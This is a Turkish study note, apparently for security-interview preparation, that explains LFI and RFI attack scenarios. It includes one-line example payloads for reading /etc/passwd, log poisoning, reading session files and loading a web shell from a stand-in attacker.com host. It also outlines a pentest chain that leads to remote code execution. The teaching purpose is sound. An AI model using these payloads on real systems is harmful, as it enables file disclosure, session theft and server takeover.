# 📌 4-Temel Saldırı Senaryoları  

Bu bölümde **Local File Inclusion (LFI)** ve **Remote File Inclusion (RFI)** açıklarının tipik saldırı senaryoları incelenecektir. Amaç, hem saldırgan bakış açısını anlamak hem de mülakatlarda sorulabilecek pratik örnekler üzerinden bu zafiyetleri daha iyi kavramaktır.  

---

## 📌 1. Local File Inclusion (LFI) Saldırı Senaryoları  

### a) Hassas Dosyaların Okunması  
- Amaç: Sunucuya ait yapılandırma ve kullanıcı bilgilerini elde etmek.  
- Örnek payload:  
  `/index.php?page=../../../../etc/passwd`  
- Sonuç: Kullanıcı hesapları, sistem servisleri hakkında bilgi edinilir.  

### b) Log Poisoning (Kayıt Zehirleme)  
- Amaç: Log dosyalarına zararlı PHP kodu enjekte ederek çalıştırmak.  
- Adımlar:  
  1. Hedefin Apache/Nginx log dosyasını bulun.  
  2. HTTP User-Agent başlığına zararlı kod ekleyin.  
  3. LFI yoluyla log dosyasını çalıştırın.  
- Örnek payload:  
  `/index.php?page=../../../../var/log/apache2/access.log`  
- Sonuç: Uzaktan kod çalıştırma (RCE) elde edilebilir.  

### c) Session Hijacking  
- Amaç: Kullanıcı oturum dosyalarına erişmek.  
- Örnek payload:  
  `/index.php?page=../../../../var/lib/php/sessions/sess_<id>`  
- Sonuç: Kullanıcı kimlik doğrulaması atlatılabilir.  

---

## 📌 2. Remote File Inclusion (RFI) Saldırı Senaryoları  

### a) Uzak Dosya Çalıştırma  
- Amaç: Zararlı bir dosyayı uzak bir sunucudan yükleyip çalıştırmak.  
- Örnek payload:  
  `/index.php?page=http://attacker.com/shell.txt`  
- Sonuç: Sunucu üzerinde web shell elde edilir.  

### b) Arka Kapı Bırakma  
- Amaç: Kalıcı erişim için zararlı dosya yüklemek.  
- Senaryo:  
  1. RFI ile zararlı PHP dosyası yüklenir.  
  2. Bu dosya hedef sunucuda arka kapı işlevi görür.  
- Sonuç: Kalıcı uzaktan erişim sağlanır.  

### c) Botnet veya Malware Dağıtımı  
- Amaç: Sunucuyu kötüye kullanarak zararlı yazılım dağıtmak.  
- Senaryo:  
  - Sunucuya RFI yoluyla zararlı kod eklenir.  
  - Siteyi ziyaret eden kullanıcılar kötü amaçlı yazılım indirir.  

---

## 📌 3. LFI ve RFI’nin Kombinasyonu  

### Senaryo:  
- LFI kullanarak log dosyalarına erişilir.  
- Log poisoning tekniği ile içine zararlı kod eklenir.  
- Eğer `allow_url_include` açıksa, RFI ile doğrudan zararlı dosya çağrılabilir.  
- Sonuç: LFI → RFI → RCE zinciri kurulabilir.  

---

## 📌 4. Yaygın Kullanım Alanları (Geliştirici Açısından)  

- **Dinamik Sayfa Yönlendirme:** `index.php?page=about.php`  
- **Dil/Çeviri Sistemi:** `index.php?lang=tr.php`  
- **Tema / Şablon Yönetimi:** `theme.php?file=header.php`  
- **Modül Yükleme:** `plugin.php?module=gallery.php`  

Bu senaryolar, saldırganların zafiyetleri tetiklemek için en sık kullandığı yerlerdir.  

---

## 📌 Kullanım (Pentester Açısından)  

1. **Keşif:**  
   - Parametre adları (file, page, doc, lang) tespit edilir.  
   - Fuzzing araçları (wfuzz, ffuf, Burp Suite Intruder) kullanılır.  

2. **Test:**  
   - Path traversal teknikleri (`../`, `%2e%2e%2f`) denenir.  
   - Uzak URL çağrıları test edilir.  

3. **İstismar:**  
   - LFI → hassas dosya okuma → log poisoning → RCE  
   - RFI → doğrudan shell yükleme → arka kapı bırakma  

4. **Genişletme:**  
   - Yetki yükseltme (privilege escalation)  
   - Ağ pivoting ile başka sistemlere erişim  

---

## 📌 Sonuç  

- **LFI senaryoları**, hassas verilerin ifşası, oturum bilgileri çalınması ve dolaylı yoldan RCE’ye yol açabilir.  
- **RFI senaryoları**, doğrudan uzak dosya yüklenmesine imkan vererek kritik seviyede güvenlik riski taşır.  
- Gerçek saldırılarda bu açıklar genellikle **kombine şekilde** kullanılır.  

👉 Bir mülakatta, adayın bu senaryoları detaylı açıklayabilmesi, kullanılan payloadları bilmesi ve saldırının **risk seviyesini** ifade edebilmesi beklenir.  
